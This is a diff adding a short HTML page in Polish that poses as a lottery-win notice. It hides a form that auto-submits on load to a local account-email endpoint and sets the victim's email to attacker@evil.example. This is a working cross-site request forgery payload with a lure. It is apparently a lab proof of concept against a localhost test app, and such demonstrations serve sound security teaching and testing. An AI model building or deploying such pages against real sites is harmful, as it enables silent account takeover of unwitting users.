@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="pl">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Niewinna strona</title>
+  </head>
+  <body>
+    <h1>Zwyciezyles w loterii!</h1>
+    <p>Pobieramy nagrode...</p>
+    <form
+      id="attack"
+      action="http://127.0.0.1:8088/api/account/email"
+      method="GET"
+    >
+      <input type="hidden" name="newEmail" value="attacker@evil.example" />
+    </form>
+    <script>
+      document.getElementById("attack").submit();
+    </script>
+  </body>
+</html>
